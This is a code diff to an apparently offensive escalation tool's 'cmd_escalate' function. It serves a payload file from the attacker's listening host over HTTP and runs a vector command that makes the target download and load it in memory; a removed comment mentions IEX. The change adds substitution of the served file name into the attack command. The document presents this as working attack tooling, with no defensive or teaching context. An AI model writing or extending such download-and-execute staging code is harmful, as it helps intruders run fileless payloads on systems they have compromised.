@@ -659,11 +659,14 @@ def cmd_escalate(args):
                                 "the in-memory payload")
                 else:
                     directory = os.path.dirname(paths[0])
+                    served = os.path.basename(paths[0])
                     with staging_mod.serve(directory) as port:
                         url = f"http://{cfg.get('lhost')}:{port}/"
-                        print(f"  serving {os.path.basename(paths[0])} on "
-                              f"{cfg.get('lhost')}:{port} — target IEX-loads it in memory")
-                        res = _run_vector(vector, vector.command.replace("{url}", url))
+                        print(f"  serving {served} on {cfg.get('lhost')}:{port} — "
+                              f"target loads it in memory")
+                        command = (vector.command.replace("{url}", url)
+                                   .replace("{served}", served))
+                        res = _run_vector(vector, command)
             else:
                 res = _run_vector(vector, vector.command)
             results[vector.key] = res
